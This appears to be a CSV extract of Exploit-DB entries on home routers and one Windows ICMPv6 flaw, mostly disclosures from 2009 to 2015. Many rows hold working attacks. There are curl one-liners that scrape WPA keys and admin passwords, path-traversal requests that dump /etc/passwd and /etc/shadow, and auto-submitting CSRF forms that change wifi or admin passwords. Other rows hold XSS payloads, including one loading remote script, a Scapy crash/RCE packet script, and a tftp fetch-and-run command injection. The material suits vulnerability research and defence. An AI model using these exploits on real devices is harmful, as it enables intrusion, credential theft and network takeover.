2015-01-07,WebApps,Hardware,Eduardo Novella,Pirelli ADSL2/2+ Wireless Router P.DGA4001N,Information Disclosure,"# Rebooting the router remotely and provoking a Denial of Service
http://${IP_ADDRESS}/resetrouter.html
// done hiding -->
http://${IP_ADDRESS}/rebootinfo.cgi?sessionKey=233665123
# All the information what we can fetch from.
http://packetstormsecurity.com/files/115663/Alpha-Networks-ADSL2-2-Wireless-Router-ASL-26555-Password-Disclosure.html","- Title:
CVE-2015-0554 ADB BroadBand Pirelli ADSL2/2+ Wireless Router P.DGA4001N  remote information disclosure
HomeStation Movistar
- Author:
Eduardo Novella  @enovella_
ednolo[@]inf.upv[dot]es
- Version:
Tested on firmware version PDG_TEF_SP_4.06L.6
- Shodan dork :
+ ""Dropbear 0.46 country:es""  ( From now on it looks like not working on this way)
- Summary:
HomeStation movistar has deployed routers manufactured by Pirelli. These routers are vulnerable to fetch HTML code from any
IP public over the world. Neither authentication nor any protection to avoid unauthorized extraction of sensitive information.
- The vulnerability and the way to exploit it:
$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i ""WLAN_""
<option value='0'>WLAN_DEAD</option>
$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i ""var wpapskkey""
var wpaPskKey = 'IsAklFHhFFui1sr9ZMqD';
$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i ""var WscDevPin""
var WscDevPin    = '12820078';
$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i ""var sessionkey""
var sessionKey='1189641421';
$ curl -s http://${IP_ADDRESS}/wlcfg.html | grep -i ""bssid:"" -A 3
<td width=""50"">BSSID:</td>
<td>
DC:0B:1A:XX:XX:XX
</td>
We can observe at the source:
<!-- hide
var sessionKey='846930886';
function btnReset() {
var loc = 'rebootinfo.cgi?';
loc += 'sessionKey=' + sessionKey;
var code = 'location=""' + loc + '""';
eval(code);
webs$ ls
adslcfgadv.html       diagpppoe.html      ipv6lancfg.html    qoscls.html              statsatmreset.html
adslcfgc.html         dlnacfg.html        js                 qosqmgmt.html            statsifc.html
adslcfg.html          dnscfg.html         jsps               qosqueueadd.html         statsifcreset.html
adslcfgtone.html      dnsproxycfg.html    lancfg2.html       qsmain.html              statsmocalanreset.html
algcfg.html           dsladderr.html      languages          quicksetuperr.html       statsmocareset.html
APIS                  dslbondingcfg.html  lockerror.html     quicksetup.html          statsmocawanreset.html
atmdelerr.html        enblbridge.html     logconfig.html     quicksetuptesterr.html   statsvdsl.html
backupsettings.html   enblservice.html    logintro.html      quicksetuptestsucc.html  statsvdslreset.html
berrun.html           engdebug.html       logobkg.gif        rebootinfo.html          statswanreset.html
berstart.html         ethadderr.html      logoc.gif          resetrouter.html         statsxtmreset.html
berstop.html          ethdelerr.html      logo_corp.gif      restoreinfo.html         storageusraccadd.html
certadd.html          footer.html         logo.html          routeadd.html            stylemain.css
certcaimport.html     hlpadslsync.html    logomenu.gif       rtdefaultcfgerr.html     threeGPIN.html
certimport.html       hlpatmetoe.html     main.html          rtdefaultcfg.html        todadd.html
certloadsigned.html   hlpatmseg.html      menuBcm.js         scdmz.html               tr69cfg.html
cfgatm.html           hlpethconn.html     menu.html          scinflt.html             updatesettings.html
cfgeth.html           hlppngdns.html      menuTitle.js       scmacflt.html            upload.html
cfgl2tpac.html        hlppnggw.html       menuTree.js        scmacpolicy.html         uploadinfo.html
cfgmoca.html          hlppppoasess.html   mocacfg.html       scoutflt.html            upnpcfg.html
cfgptm.html           hlppppoeauth.html   multicast.html     scprttrg.html            url_add.html
colors.css            hlppppoeconn.html   natcfg2.html       scripts                  util.js
config.json.txt       hlppppoeip.html     ntwksum2.html      scvrtsrv.html            wanadderr.html
css                   hlptstdns.html      omcidownload.html  seclogintro.html         wancfg.html
ddnsadd.html          hlpusbconn.html     omcisystem.html    snmpconfig.html          wlcfgadv.html
defaultsettings.html  hlpwlconn.html      password.html      sntpcfg.html             wlcfg.html
dhcpinfo.html         html                portmapadd.html    standby.html             wlcfgkey.html
diag8021ag.html       ifcdns.html         portmapedit.html   StaticIpAdd.html         wlmacflt.html
diagbr.html           ifcgateway.html     portName.js        StaticIpErr.html         wlrefresh.html
diag.html             images              pppoe.html         statsadslerr.html        wlsecurity.html
diagipow.html         index.html          pradd.html         statsadsl.html           wlsetup.html
diaglan.html          info.html           ptmadderr.html     statsadslreset.html      wlwapias.html
diagmer.html          ipoacfg.html        ptmdelerr.html     statsatmerr.html         xdslcfg.html
diagpppoa.html        ippcfg.html         pwrmngt.html       statsatm.html
+ Conclusion:
This vulnerability can be exploited remotely and it should be patched as soon as possible. An attacker could be monitoring our network
or even worse being a member of a botnet without knowledge of it.
First mitigation could be  either try to update the last version for these routers or install 3rd parties firmwares as OpenWRT or DDWRT on them.
+ References:
+ Timeline:
2013-04-xx Send email to Movistar and Pirelli
2015-01-05 Full disclosure"
2011-04-15,Remote,Hardware,Edgard Chammas,Technicolor THOMSON TG585v7 Wireless Router,'url' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/47390/info
http://www.example.com/cgi/b/ic/connect/?url=[XSS]","Technicolor THOMSON TG585v7 Wireless Router is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
Attackers may exploit this issue by enticing victims into visiting a malicious site.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected device. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
Firmware versions prior to 8.2.7.6 are vulnerable."
2014-12-17,WebApps,Hardware,Chako,CIK Telecom VoIP Router SVG6000RW,Privilege Escalation / Command Execution,"# Exploit Title: CIK Telecom VoIP router SVG6000RW Privilege Escalation and Command Execution
# Date: 2014/12/10
# Exploit Author: Chako
# Vendor Homepage: https://www.ciktel.com/
Description:","CIK Telecom VoIP router SVG6000RW has a Privilege Escalation vulnerabilitie
and can lead to Command Execution.
Exploit:
1) Login as a normal user
Default Username: User Password:cikvoip
2) change URL to http://URL/adm/system_command.asp
and now u can run commands.
Example:
Command: ls /etc_rw/web
Result:
internet
cgi-bin
homemode_conf.asp
menu-en.swf
wireless
md5.js
hotelmode_conf.asp
waitAndReboot.asp
graphics
menu.swf
getMac.asp
quickconfig.asp
javascript
firewall
home.asp
customermode_conf.asp
wait.asp
station
login.asp
main.css
overview.asp
style
voip
lang
wps
usb
adm"
2014-11-22,WebApps,Hardware,LiquidWorm,Netgear WNR500 Wireless Router,'webproc?getpage' Traversal Arbitrary File Access,"Summary: The NETGEAR compact N150 classic wireless router (WNR500) improves
Desc: The router suffers from an authenticated file inclusion vulnerability
#root:x:0:0:root:/root:/bin/bash
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh
#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","Netgear Wireless Router WNR500 Parameter Traversal Arbitrary File Access Exploit
Vendor: NETGEAR
Product web page: http://www.netgear.com
Affected version: WNR500 (firmware: 1.0.7.2)
your legacy Wireless-G network. It is a simple, secure way to share your
Internet connection and allows you to easily surf the Internet, use email,
and have online chats. The quick, CD-less setup can be done through a web
browser. The small, efficient design fits perfectly into your home.
(LFI) when input passed thru the 'getpage' parameter to 'webproc' script is
not properly verified before being used to include files. This can be exploited
to include files from local resources with directory traversal attacks.
Tested on: mini_httpd/1.19 19dec2003
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2014-5208
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5208.php
16.11.2014
= 1 =============================================================
GET /cgi-bin/webproc?getpage=../../../etc/passwd&var:menu=advanced&var:page=null HTTP/1.1
Host: 192.168.1.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sessionid=7dc3268b; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; sessionid=7dc3268b; auth=ok; expires=Mon, 31-Jan-2050 16:00:00 GMT; language=en_us
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: keep-alive
HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache
set-cookie: sessionid=7dc3268b;
set-cookie: auth=ok;
set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;
root:x:0:0:root:/root:/bin/sh
= 2 =============================================================
GET /cgi-bin/webproc?getpage=../../../etc/shadow&var:menu=advanced&var:page=null HTTP/1.1
Host: 192.168.1.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sessionid=7dc3268b; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; sessionid=7dc3268b; auth=ok; expires=Mon, 31-Jan-2050 16:00:00 GMT; language=en_us
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: keep-alive
HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache
set-cookie: sessionid=7dc3268b;
set-cookie: auth=ok;
set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;
root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::"
2014-10-14,WebApps,Hardware,zixian,Tenda A32 Router,Cross-Site Request Forgery,"# Exploit Title: Tenda A32 Router CSRF Vulnerability(reboot the Router)
# CVE ID :CVE-2014-7281
# Date: 2014-10-10
# Exploit Author: zixian
# Vendor Homepage: http://tenda.com.cn/
# Software Link: http://tenda.com.cn/Catalog/Product/325
# Version: V5.07.53_CN","When the administrator login, click on the link below， the device will reboot。
<a href=""http://192.168.2.1/goform/SysToolReboot"">reboot</a>"
2014-08-18,WebApps,Hardware,zixian,Tenda A5s Router 3.02.05_CN,Authentication Bypass,"http://192.168.2.1/
http://192.168.2.1/advance.asp","Tenda A5s Router Authentication Bypass Vulnerability
Author      : zixian
Mail        : me@zixian.org
Date        : Aug, 17-2014
Vendor      : http://tenda.com.cn/
Link        : http://tenda.com.cn/Catalog/Product/223
Version     : V3.02.05_CN
CVE         : CVE-2014-5246
Exploit & p0c
go to
then set cookie with javascript
javascript:document.cookie='admin:language=zh-cn'
go to
you are the admin!"
2014-08-09,DoS,Hardware,Matt O'Connor,Sky Broadband Router SR101,Weak WPA-PSK Generation Algorithm,"# Exploit Title: Sky Broadband Router  Weak algorithm used to generate WPA-PSK Key
# Google Dork:
# Date: 08/08/2014
# Author: Matt O'Connor / Planit Computing
# Advisory Link:  http://www.planitcomputing.ie/sky-wifi-attack.pdf
# Version:
# Category: Remote
# Tested on: Sky SR101 Router","The SR101 routers supplied by Sky Broadband are vulnerable to an offline dictionary attack if the WPA-PSK handshake is obtained by an attacker.
The WPA-PSK pass phrase has the following features:
Random
A to Z Uppercase only
8 characters long
208,827,064,576 possible combinations ( AAAAAAAA  ZZZZZZZZ ) 26^8
We notified Sky Broadband about the problem in January 2014 yet Sky Broadband are still supplying customers with routers / modems that use this weak algorithm.
At the time, graphics cards were expensive and clustering several machines was not financially viable to the average hacker.
We purchased a used rig in December 2013, comprising off:
Windows 7
I3 Processor
4GB RAM
2TB Drive
Radeon HD 5850
We generated 26 dictionary files using mask processor by ATOM, piping each letter out to its own file, for example:
A:  ./mp32 A?u?u?u?u?u?u?u > A.TXT = AAAAAAAA  AZZZZZZZ
B: ./mp32 B?u?u?u?u?u?u?u > B.TXT = BAAAAAAA  BZZZZZZZ
etc
Each .txt file weighed in at around 60GBs each.  The 26 files took up about 1.6TB of storage.
We now had the complete key space, partitioned into 26 different files.  This allowed us to distribute the brute force attack amongst multiple computers.  There are other ways with ocl-hashcat but this was the simplest.
Using our Radeon HD5850 on standard settings, we were hitting 80,000 keys per second.  Breakdown below:
26^8 = 208,827,064,576 ( 208 billion possible combinations )
26^8 / 80,000 keys per second = 2,610,338 seconds
2,610,338 / 60 seconds = 43,505 minutes
43,505 / 60 minutes = 725 hours
725 hours / 24 hours = 30 Days
For 185, we had built a computer that could crack the default Sky Broadband wireless password within 30 days.  The WPA-PSK handshake we used started with the letter S and was cracked within 96 hours.
We ended up getting a second machine for the same price which resulted in our maximum cracking time being reduced to 15 days.
If youre using the default password on your Sky Broadband connection, we recommend changing it immediately to a more secure password, using a mix of letters, numbers and symbols."
2014-08-03,WebApps,Hardware,Christoph Kuhl,TP-Link TL-WR740N v4 Router (FW-Ver. 3.16.6 Build 130529 Rel.47286n),Command Execution,"# Exploit Title: TP-Link TL-WR740N v4 router (FW-Ver. 3.16.6 Build 130529 Rel.47286n) arbitrary shell command execution
# Date: 08/03/2014
# Exploit Author: Christoph Kuhl
# Vendor Homepage: http://www.tp-link.com
# Software Link:  http://www.tp-link.com.de/resources/software/TL-WR740N_V4_130529.zip
# Version: FW-Ver. 3.16.6 Build 130529 Rel.47286n
# Tested on: TP-Link TL-WR740N v4
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/34254.7z (Password: TP-P0wned-Link)","Exploit:
Vulnerability description:
The domain name parameters of the ""Parental Control"" and ""Access
Control"" features of the TP-Link TL-WR740N v4 (FW-Ver. 3.16.6 Build
130529 Rel.47286n) router are prone to arbitrary shell command execution
as root for users who are authenticated against the web interface.
Each shell payload is restricted up to 28 bytes. The ""Parental Control""
feature allows you to specify 8 domains (= 8 commands) so you have 8 x
28 = 244 bytes of shell commands. This is sufficient to post-load and
execute a shell script of arbitrary length from a tftp server.
Employing this method one can gain full control over the device when
post-loading a mightier busybox MIPS binary and executing telnetd or
using netcat to connect back. Default login credentials are known to be
root:5up, Admin:5up or ap71:.
Technical Cause:
The web interface and the whole routing logic on the device is
controlled by a single homebrew process (httpd) running as root.
This binary is employing various fopen() and system() calls in order to
configure the device.
One of these calls refers to a script (/tmp/wr841n/parent.sh) being
filled with user input data from the ""Parental Control"" mask.
iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source
00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls USER INPUT
HERE,return1 -j RETURN
iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source
00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls ANOTHER USER
INPUT HERE,return1 -j RETURN
The input data is only poorly checked by some JavaScript functions but
the server accepts most characters. Entering a shell command surrounded
by ';' will result in code execution:
iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source
00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls ;tftp -gr a
192.168.0.1;,;sh a;,return1 -j RETURN
The same goes for the Access Control Feature. The only difference is
that the script name is /tmp/wr841n/accessCtrl.sh.
The attack is persistent until resetting the parental control or access
control settings. After rebooting the device will execute the commands
again.
This vulnerability may or may not affect other TP-Link hardware and
software versions. However it was only tested against TP-Link TL-WR740N
v4 (FW-Ver. 3.16.6 Build 130529 Rel.47286n) within the local network.
Exploit POC code description:
The exploit tries to load and execute a shell script called 'a' (for
attack) from the specified tftpd server. This is for the circumventing
the length restriction of 28 bytes and the fact that the preloaded
busybox binary is a bit restricted (no netcat and telnetd available).
The 'a' script then loads a mightier busybox (filename busyboxx) binary
from the tftp server specified in that 'a' script (default 192.168.0.1).
It also sets up a more comfortable environment and starts telnetd as
well as a ftp server.
You can then connect to the router via telnet and ftp.
The exploit code is written in C# (.NET 4.5) so you need .NET Framework
4.5 to execute it.
Usage:
ParentalControlExploit.exe [/a | /p] [RouterIp] [RouterWebIfaceUsername]
[RouterWebIfacePassword] [TFTPServerIp]
TP-Link TL-WR740N v4 parental control and access control exploit. 2014
by C. Kuhl.
Options:
/a            Use Access Control Exploit
/p            Use Parental Control Exploit
[RouterIp]    IP of the target to attack (default 192.168.0.1)
[Username]    Username of the Webinterface Login (default admin)
[Password]    Username of the Webinterface Login (default admin)
[TFTPServer]  TFTP Host where the 'a' shell file is hosted for execution
Example: ParentalControlExploit.exe /a 192.168.0.1 admin admin 192.168.0.100
History of the flaw:
07/01/2014    -    Found it
07/05/2014    -    Notified TP Link via their Online Support Contact
form including detailed description and link to POC exploit
07/14/2014    -    Got answer via mail that they could not reproduce the
flaw via the router's web interface and asked for more information.
07/26/2014    -    Replied to TP-Link that one cannot reproduce the bug
via the router's web interface due to the javascript ""check logic"" and
that they need to either employ direct GET requests or use the provided
exploit
07/29/2014    -    TP Link states that this was no security flaw because
the attacker had to know the credientials to the webinterface. It was
like giving the key to your flat to a housebreaker.
08/03/2014    -    Publication"
2010-06-23,Remote,Hardware,Cristofaro Mune,Linksys WAP54Gv3 Wireless Router,'debug.cgi' Cross-Site Scripting,source: https://www.securityfocus.com/bid/41061/info,"Linksys WAP54Gv3 Wireless Router is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
Attackers may exploit this issue by enticing victims into visiting a malicious site.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected device. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
The following firmware versions are vulnerable:
3.05.03 (Europe)
3.04.03 (US)
The following example input to the vulnerable parameter is available:
echo ""&lt;/textarea&gt;<script>alert('XSS');</script>"""
2010-02-04,Remote,Hardware,Karn Ganeshen,Sterlite SAM300 AX Router,'Stat_Radio' Cross-Site Scripting,source: https://www.securityfocus.com/bid/39928/info,"The Sterlite SAM300 AX Router is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
*+POST Request+*
POST http://192.168.1.1/Forms/status_statistics_1 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.7)
Gecko/20091221 Firefox/3.5.7 Paros/3.2.13
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://192.168.1.1/status/status_statistics.htm
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/x-www-form-urlencoded
Content-length: 101
*+POST Parameters+*
Stat_Radio=%3CSCRIPT%20SRC%3Dhttp%3A%2F%2Fha.ckers.org
%2Fxss.js%3E%3C%2FSCRIPT%3E&StatRefresh=REFRESH
*+Impact+*"
2010-02-09,Remote,Windows,Sumit Gwalani,Microsoft Windows Vista/2008,ICMPv6 Router Advertisement Remote Code Execution,source: https://www.securityfocus.com/bid/38061/info,"Microsoft Windows TCP/IP protocol implementation is prone to a remote code-execution vulnerability.
An attacker can exploit this issue to execute arbitrary code with SYSTEM-level privileges. Successful attacks will completely compromise affected computers. Failed exploit attempts will likely result in denial-of-service conditions.
v6_dst = ""<IPv6 address>""
mac_dst = ""<Mac address>""
pkt = IPv6(dst=v6_dst, hlim=255) / IPv6ExtHdrFragment() / ICMPv6ND_RA() / ICMPv6NDOptPrefixInfo(len=255, prefixlen=64, prefix=""2001::"") / Raw(load='A'*2008)
l=fragment6(pkt, 1500)
for p in l:
sendp(Ether(dst=mac_dst)/p, iface=""eth0"")"
2010-01-29,Remote,Hardware,Yoyahack,COMTREND CT-507 IT ADSL Router,'scvrtsrv.cmd' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/38004/info
http://www.example.com/scvrtsrv.cmd?action=add&srvName=XSS_HERE&srvAddr=192.168.1.1&proto=1,&eStart=1,&eEnd=1,&iStart=1,&iEnd=1","Comtrend CT-507 IT is prone to a cross-site scripting vulnerability because the device's web interface fails to properly sanitize user-supplied input.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks."
2014-05-26,WebApps,Hardware,Kyle Lovett,D-Link Routers,Multiple Vulnerabilities,"http://<IP>/apply.cgi
http://<IP>/apply_sec.cgi
http://<IP>:8080/hnap.cgi and /HNAP1/ via:
http://<IP>/cgi/ssi/ which will offer a download of the device's ELF
http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10025
http://securityadvisories.dlink.com/security/","The following five D-Link model routers suffer from several
vulnerabilities including Clear Text Storage of Passwords, Cross Site
Scripting and Sensitive Information Disclosure.
DIR-652
D-Link  Wireless N Gigabit Home Router
DIR-835
D-Link Network DIR-835L Wireless N 750M Dual-band 802.11n 4Port Gigabit Router
DIR-855L -
D-Link Wireless N900 Dual Band Gigabit Router
DGL-5500
D-Link AC1300 Gaming Router
DHP-1565
D-Link Wireless N PowerLine Gigabit Router
Affected firmware - FW 1.02b18/1.12b02 or older
Access - Remote
Complexity - Low
Authentication - None
Impact - Full loss of confidentiality
Clear Text Password - CWE - CWE-316: Cleartext Storage of Sensitive Information
Authentication can be bypassed to gain access to the file
tools_admin.asp, which stores the devices admin password in plain
text, by adding a ""/"" to the end of the URL.
Proof of Concept for the DGL-5500, DIR-855L and the DIR-835:
curl -s http://<IP>/tools_admin.asp/ |awk '/hidden/ &&
/admin_password_tmp/ && /value/ {print $5}'
PoC for the DHP-1565 and DIR-652, the generic 'user' must be added.
curl -s http://<IP>/tools_admin.asp/ -u user:|awk '/hidden/ &&
/admin_password_tmp/ && /value/ {print $5}'
Cross Site Scripting - CWE - CWE-79: Improper Neutralization of User
Input / Return
For the file ""apply.cgi"" (""apply_sec.cgi"" on the DGL-5500) the POST
param ""action"" suffers from a XSS vulnerability due to improper
neutralization of user input / return output.
PoC for DIR-855L, DIR-835, DHP-1565
POST
graph_code=X&session_id=123456&login_n=user&login_name=8&action=%3Cbody%3E%3Chtml%3E%3Ch2%3E%3CEMBED%20src%3D%22%3Ctd%20dir%3D%22rtl%22class%3D%22skytext%22width%3D%2277%25%22%3E%3Cmarquee%20%20%20scrollAmount%3D5%20scrollDelay%3D10%20direction%3D%22right%22style%3D%22color%3Ared%3Bfont-weight%3Abold%3B%22%3ESquirrel%20Injection%22%3C%2fh2%3E%3C%2fmarquee%3E%20%3C%2fbody%3E%3C%2fhtml%3E%3C%2ftd%3E%3E&log_pass=&html_response_page=login_pic.asp&tmp_log_pass=&gcode_base64=MTg0MzU%3D
HTTP/1.1
For the DGL-5500
POST
graph_code=X&session_id=123456&login_n=user&login_name=8&action=%3Cbody%3E%3Chtml%3E%3Ch2%3E%3CEMBED%20src%3D%22%3Ctd%20dir%3D%22rtl%22class%3D%22skytext%22width%3D%2277%25%22%3E%3Cmarquee%20%20%20scrollAmount%3D5%20scrollDelay%3D10%20direction%3D%22right%22style%3D%22color%3Ared%3Bfont-weight%3Abold%3B%22%3ESquirrel%20Injection%22%3C%2fh2%3E%3C%2fmarquee%3E%20%3C%2fbody%3E%3C%2fhtml%3E%3C%2ftd%3E%3E&log_pass=&html_response_page=login_pic.asp&tmp_log_pass=&gcode_base64=MTg0MzU%3D
HTTP/1.1
Sensitive Information Disclosure - CWE - CWE-200: Information Exposure
The D-Link models DGL-5500, DIR-855L, DIR-835 suffer from a
vulnerability which an unauthenticated person can gain access the
sensitive files:
curl -s curl -s http://<IP>:8080/HNAP1/
On the DIR-652  and DHP-1565, a user needs authentication first to
gain access to these files.
But more importantly, an unauthenticated user can browse directly to
MBS MIPS file. The file contains most of the devices internal working
structure and sensitive information. These particular routers use  a
MSB EM_MIPS Processor and it does contain executable components.
The file can be accessed through at least one known cgi file, however
there maybe others. Although no known publicly working example exist
to my knowledge, unpatched devices are susceptible to injection of
malicious code and most likely susceptible to a payload which could
deploy a self-replicating worm.
These items were reported to D-Link on April 20th, and to US Cert on
April 21. D-Link does have patches available for all affected models,
and it is highly recommended to update the device's firmware as soon
as possible.
Vendor Links:
Research Contact - Kyle Lovett
May 21, 2014"
2014-05-26,WebApps,Hardware,Mustafa ALTINKAYNAK,ZYXEL P-660HW-T1 3 Wireless Router,Cross-Site Request Forgery,"# Exploit Title: Zyxel P-660HW-T1 v3 Wireless Router - CSRF Vulnerabilities
# Date: 05/22/2014
# Author: Mustafa ALTINKAYNAK
# Vendor Homepage:http://www.zyxel.com/tr/tr/products_services/p_660hw_series.shtml?t=p
# Category: Hardware/Wireless Router
# Tested on: Zyxel P-660HW-T1 v3 Wireless Router
# Patch/ Fix: Vendor has not provided any fix for this yet
www.mustafaaltinkaynak.com","Technical Details
This vulnerability was tested at the P-660HW-T1 devices. Admin panel is open you can run remote code destination.
You can send the form below to prepare the target. Please offending. Being partners in crime.
Disclosure Timeline
05/21/2014  Contacted Vendor
05/22/2014  Vendor Replied
04/22/2014  Vulnerability Explained (No reply received)
05/23/2014  Full Disclosure
Exploit Code
Change Wifi (WPA2/PSK) password & SSID by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://192.168.1.1/Forms/WLAN_General_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""EnableWLAN"" value=""on"">
<input type=""hidden"" name=""Channel_ID"" value=""00000005"">
<input type=""hidden"" name=""ESSID"" value=""WIFI NAME"">
<input type=""hidden"" name=""Security_Sel"" value=""00000002"">
<input type=""hidden"" name=""SecurityFlag"" value=""0"">
<input type=""hidden"" name=""WLANCfgPSK"" value=""123456"">
<input type=""hidden"" name=""WLANCfgWPATimer"" value=""1800"">
<input type=""hidden"" name=""QoS_Sel"" value=""00000000"">
<input type=""hidden"" name=""sysSubmit"" value=""Uygula"">
</form>
</body>
</html>
Mustafa ALTINKAYNAK
twitter : @m_altinkaynak <https://twitter.com/m_altinkaynak>"
2014-05-21,WebApps,Hardware,Samandeep Singh,Binatone DT 850W Wireless Router,Multiple Cross-Site Request Forgery Vulnerabilities,"# Exploit Title: Binatone DT 850W Wireless Router - Multiple CSRF Vulnerabilities
# Date: 05/20/2014
# Author: Samandeep Singh - SaMaN( @samanL33T )
# Vendor Homepage:http://www.binatonetelecom.in/4port-adsl2-wifi-router1.html
# Category: Hardware/Wireless Router
# Firmware Version: T6W-A1.005 and below
# Tested on: Binatone DT 850W Wireless Router
# Patch/ Fix: Vendor has not provided any fix for this yet","Disclosure Timeline
04/23/2014  Contacted Vendor
04/26/2014Vendor Replied
04/26/2014Vulnerability Explained (No reply received)
05/04/2014Vendor notified about full disclosure in 15 days (No reply)
05/20/2014Full Disclosure
Technical Details
Binatone DT 850W Wireless Router has a Cross Site Request Forgery Vulnerability in its Web Console. Attacker can easily change Wireless password, SSId of Wireless network,Reboot Router, Reset Router,Change Router's Admin Password by simply making the user visit a CSRF link.
Exploit Code
Change Wifi (WPA2/PSK) password & SSID by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://[TARGET/IP]/Forms/home_wlan_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""wlanWEBFlag"" value=""0"">
<input type=""hidden"" name=""AccessFlag"" value=""0"">
<input type=""hidden"" name=""wlan_APenable"" value=""1"">
<input type=""hidden"" name=""Countries_Channels"" value=""INDIA"">
<input type=""hidden"" name=""Channel_ID"" value=""00000000"">
<input type=""hidden"" name=""BeaconInterval"" value=""100"">
<input type=""hidden"" name=""RTSThreshold"" value=""2347"">
<input type=""hidden"" name=""FragmentThreshold"" value=""2346"">
<input type=""hidden"" name=""DTIM"" value=""1"">
<input type=""hidden"" name=""WirelessMode"" value=""802.11b+g+n"">
<input type=""hidden"" name=""WLANChannelBandwidth"" value=""20/40 MHz"">
<input type=""hidden"" name=""WLANGuardInterval"" value=""AUTO"">
<input type=""hidden"" name=""WLANMCS"" value=""AUTO"">
<input type=""hidden"" name=""wlan_MBSSIDNumber"" value=""2"">
<input type=""hidden"" name=""WLSSIDIndex"" value=""1"">
<input type=""hidden"" name=""ESSID_HIDE_Selection"" value=""0"">
<input type=""hidden"" name=""ESSID"" value=""[SSID]"">
<input type=""hidden"" name=""WEP_Selection"" value=""WPA2-PSK"">
<input type=""hidden"" name=""TKIP_Selection"" value=""AES"">
<input type=""hidden"" name=""PreSharedKey"" value=""[PASSWORD]"">
<input type=""hidden"" name=""WPARekeyInter"" value=""3600"">
<input type=""hidden"" name=""WDSMode_Selection"" value=""0"">
<input type=""hidden"" name=""WLAN_FltActive"" value=""0"">
<input type=""hidden"" name=""wlanRadiusWEPFlag"" value=""0"">
<input type=""hidden"" name=""MBSSIDSwitchFlag"" value=""2"">
</form>
</body>
</html>
Factory Reset Router Settings by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://TARGET/IP]Forms/tools_system_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""restoreFlag"" value=""1"">
</form>
</body>
</html>
Change Router's Admin Password by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://[TARGET/IP]/Forms/tools_admin_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""uiViewTools_Password"" value=""[PASSWORD]"">
<input type=""hidden"" name=""uiViewTools_PasswordConfirm"" value=""[PASSWORD]"">
</form>
</body>
</html>
Restart Router by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://TARGET/IP]/Forms/tools_system_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""restoreFlag"" value=""0"">
</form>
</body>
</html>
SaMaN
twitter : @samanL33T <https://twitter.com/samanL33T>"
2009-08-12,Remote,Hardware,hkm,2WIRE Routers,'CD35_SETUP_01' Access Validation,"source: https://www.securityfocus.com/bid/36031/info
http://gateway.example.net?xslt?page=CD35_SETUP_01
